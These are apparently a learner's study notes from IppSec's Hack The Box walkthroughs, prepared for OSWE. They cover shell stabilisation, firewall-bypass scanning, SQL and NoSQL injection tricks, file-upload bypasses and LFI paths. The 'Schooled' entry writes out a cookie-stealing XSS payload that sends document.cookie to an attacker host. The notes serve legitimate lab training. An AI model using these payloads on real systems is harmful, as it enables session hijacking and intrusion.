Notes from IppSec's walkthroughs of the HTB machines I don't have access to :(
It's hard to practice scripting by just watching, so I went through this quickly while writing down some notes and thoughts 

Vault
  - For a fully stable shell --> python -c 'import pty;pty.spawn("/bin/bash")' --> CTRL + Z --> ssty raw -echo --> fg [enter] [enter]--> export TERM=xterm
  - You can remote port forward in order to recieve a shell on your machine that is only available internally (send reverse shell to ssh user, which forwards the connection to your attacker machine)
  - ssh -R 127.0.0.1:9001:127.0.0.1:9001
  - You can bypass firewalls with the flag --source-port x in nmap. For example, if the firewall is blocking everything except DNS (port 53), try nmap ...... --source-port 53

Popcorn
  - You can test for virtual hosts by intercepting requests and changing the Host header

Celestial
  - NodeJS deserialization in the cookie was pretty cool to see, but nothing extraordinary

Blocky
  - Remember to decompile .class and .jar files with JadX!

Falafel
  - Use --string "xxx" in sqlmap to use a string present in the response as a flag of successful injections
  - Remember the PHP magic hash trick --> With PHP loose comparison, a hash starting with 0e will always evaluate to 0
  - This means that any plaintext will work as a password as long as its hash starts with 0e (because the comparison will end up being 0 == 0)
  - The filename had a char limit, which would truncate everything beyond it. Uploading aaaaaaaa.php.gif and forcing the truncation after .gif bypassed the file upload restrictions
  - Super cool privesc --> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group
  - Super cool privesc #2 --> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group
  - Manually exploiting the SQLi with a python script is very similar to what's shown in the OSWE material!

Zipper
  - Add the prefix "nohup" to a command to make sure the process isn't tied to the original one
  - This means that if you're shell is dying due to a timeout or something similar, nohup will solve that

Unattended
  - Don't forget to check certificate details when faced with HTTPs servers, it can be good for recon
  - URLs aren't always the same as file paths. You can have alias. For example, location /dev { alias /var/www/dev; } and location / { alias /var/www/html; }
  - Use --no-string "xxx" in sqlmap to use a string present in the response as a flag of failed injections
  - This PHPSESSID injection along with LFI was pretty cool --> https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-php-sessions

Help
  - The initial exploit was tricky to fire since the time on the box was slightly off (also, timezones!)
  - To fix this, get the date from the response. Run it in a loop in order to provide a ~1 minute buffer
  - Another great box to practice crafting manual SQLi scripts in Python 

Mango
  - If you have a parameter such as username=admin&password=passwordAttempt, a cool NoSQL injection trick is to change it to username[$ne]=admin&password[$ne]passwordAttempt
  - Alternatively, the following also works! This examples checks if there's a username with 5 characters username[$regex]=^.{5}
  - Another great Python script demonstration for NoSQL injecton exploitation

Schooled
  - Awesome XSS exploitation! <script src="http://my_ip/malicious.js"></script> and fill malicious.js with a cookie stealing script
  - document.write('<img src="http://my_ip/?' + document.cookie + '">');
  - Mass assignment vulnerability --> When you can add/edit parameters which are not shown in the UI by tampering the request

Sink
  - Cool HTTP request smuggling, but this doesn't seem applicable to OSWE

Monitors
  - LFI these files in a for loop ../../../../../proc/$i/cmdline to enumerate running processes
  - LFI ../../../../../etc/apache2/sites-available/000-default.conf and you might find some other virtual hosts (apache only, obviously)

Magic
  - Methodology to bypass file upload restrictions: 1) Change MIME type; 2) Play with file extension tricks; 3) Magic Bytes
  - If your terminal is overwriting stuff (bad dimensions) change it with ssty rows y; ssty cols x; You can also check your host's dimensions with ssty -a
  
Fulcrum
  - Exploiting blind XEE can be tricky, so try doing out of band stuff to have some feedback

Unobtainium
  - Neat little trick to proxy some specific traffic through burp! Change the hosts file to 127.0.0.1 unobtanium.htb, then add a listener at 31337 and a redirect from 127.0.0.1:31337 to machine_ip:31337
  - Yes! A prototype pollution box! I absolutely loved this OSWE chapter, really fun to see it in action :D
  
Crossfit
  - You can use the Access-Control-Allow-Origin header to enumerate sudomains. Change the Origin header and check the response
  
Crossfit2
  - Grepping for grep -oP '/api/[^"]*' inside javascript files found him some interesting endpoints
  - Really awesome CORS bypass, but not applicable to the OSWE
  - The XSS script was pretty cool and I'm starting to get very comfortable with these scripts. It's like I already know what he's going to write
  
Stacked
  - Another XSS script. I thought I wouldn't learn a lot by watching, but this is really helping out
  - To save the response in a variable, the second parameter o req.open() must be set to false (async parameter)
  
Fingerprint
  - Cool manual exploitation of Java insecure deserialization
  
JSON
  - .NET deserialization but with ysoserial, no manual exploitation :(
  - And dnSpy was used, great
